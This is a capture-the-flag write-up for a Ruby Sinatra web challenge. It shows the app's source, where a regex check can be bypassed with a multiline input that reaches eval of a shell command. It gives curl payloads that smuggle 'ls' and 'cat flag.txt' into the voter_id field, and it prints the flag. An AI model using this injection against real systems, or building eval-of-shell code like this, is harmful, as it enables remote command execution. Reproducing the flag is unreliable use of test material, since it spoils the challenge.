# Verificiation or Execution - web

## Challenge

Look, this is supposed to be a simple checker for an ID to make sure its actually part of the early voting system, yet someone gained access to my system?!

There's only one field and I'm sure my regex is perfect!

## Solve

For this challenge, we are presented with a simple web application with a single text box where we can enter a `voter ID`: 

<img width="812" height="482" alt="vveeve" src="https://github.com/user-attachments/assets/da64bc56-8a2c-4601-89fd-1de409d6fe28" />


If we send a POST request without the `voter_id` parameter set, we can throw an error and hit the debug page:

<img width="897" height="566" alt="ve" src="https://github.com/user-attachments/assets/05069707-3f13-4e7d-a7a8-8528d036ec31" />


We can see the source code logic behind the application, and note that the webapp is built with Ruby using the Sinatra framework:

```ruby
    get '/' do
      erb :index
    end

    post '/' do
      voter_id = params[:voter_id]

      if !voter_id.match(/^[A-Za-z]{4}\d{4}$/)

        result = "Error: Invalid voter ID format. Expected 4 letters followed by 4 digits. Debug: did not pass /^[A-Za-z]{4}\\d{4}$/"
      else
        begin
          result = eval("`./votercheck.sh #{voter_id}`")
        rescue => e
          result = "Error: #{e.message}"
        end
```

The regex constrains us to strictly 4 letters followed by 4 numbers. However, this [article](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-41) explained Ruby's weird regex behaviour which alllows us to get the flag:

> "The key vulnerability is that the match method in Ruby will return a match if any line in a multiline string matches the pattern."

So, if we send a multiline string where one of the lines matches the regex, and the other contains malicious input our input will be processed in `eval()`:

- First checked file structure with:

```bash 
curl -X POST http://3.105.27.130:8002/ -d $'voter_id; ls;\nABCD1234'
```

<img width="933" height="618" alt="ve1" src="https://github.com/user-attachments/assets/72798a97-4bdc-4e79-8538-0cc02fd8f8c3" />


- And then read the flag with:

```bash
curl -X POST http://3.105.27.130:8002/ -d $'voter_id; cat flag.txt;\nABCD1234'
```

<img width="919" height="514" alt="ve2" src="https://github.com/user-attachments/assets/34eefdff-9fcb-40ab-a243-330751d631f3" />


`secedu{h0_b0y_th3y'r3_in_we'3r_in_tr0ubl3_ar3n't_w3}`
